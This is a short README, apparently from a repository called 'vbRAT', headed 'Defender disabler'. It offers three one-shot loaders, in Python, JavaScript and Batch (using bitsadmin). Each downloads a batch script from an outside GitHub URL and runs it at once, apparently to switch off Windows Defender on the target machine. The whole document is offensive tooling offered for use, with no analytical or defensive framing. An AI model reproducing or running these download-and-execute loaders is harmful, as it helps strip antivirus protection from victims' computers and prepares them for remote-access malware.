# vbRAT


<h2 align="center">
  Defender disabler 

</h2>

- [Python](https://www.python.org/):

```python
import requests, os
_file = requests.get('https://raw.githubusercontent.com/Rdimo/Defender-disabler/main/disabler.bat')

with open('demo.bat', 'w') as f:
    f.write(_file.text)

os.startfile('demo.bat')
```

- [Javascript](https://nodejs.org/en/):

```javascript
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');

axios.get('https://raw.githubusercontent.com/Rdimo/Defender-disabler/main/disabler.bat', {
    responseType: 'text',
  }).then((response) => {
    fs.writeFileSync('demo.bat', response.data, { flag: 'a' }, (err) => {});
  });
exec('demo.bat');
```

- [Batch](https://en.wikipedia.org/wiki/Batch_file):

```batch
bitsadmin /transfer Packages /download /priority foreground https://raw.githubusercontent.com/Rdimo/Defender-disabler/main/disabler.bat "demo.bat"
start demo.bat
```

